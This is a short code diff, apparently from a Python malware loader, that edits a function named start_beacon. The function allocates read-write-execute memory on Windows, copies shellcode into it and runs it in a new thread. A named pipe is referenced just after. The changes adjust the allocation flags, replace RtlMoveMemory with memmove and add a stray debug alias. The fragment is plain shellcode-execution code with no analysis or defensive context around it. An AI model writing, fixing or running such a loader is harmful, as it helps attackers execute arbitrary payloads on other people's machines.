@@ -99,10 +99,10 @@ def start_beacon(payload):
     buf = (c_char * len(shellcode)).from_buffer(shellcode)
     ptr = windll.kernel32.VirtualAlloc(c_int(0),
                                        c_int(len(shellcode)),
-                                       c_int(0x3000), # MEM_COMMIT
+                                       c_int(0x1000), # MEM_COMMIT
                                        c_int(0x40)) # PAGE_EXECUTE_READWRITE
-    
-    windll.kernel32.RtlMoveMemory(c_int(ptr), buf, c_int(len(shellcode)))
+    LPTHREAD_START_ROUTINE = LPVOID # DEBUG
+    memmove(ptr, buf, sizeof(buf))
     windll.kernel32.CreateThread(None, 0, c_int(ptr), None, 0, None)
 
 # Open the handle to the pipe
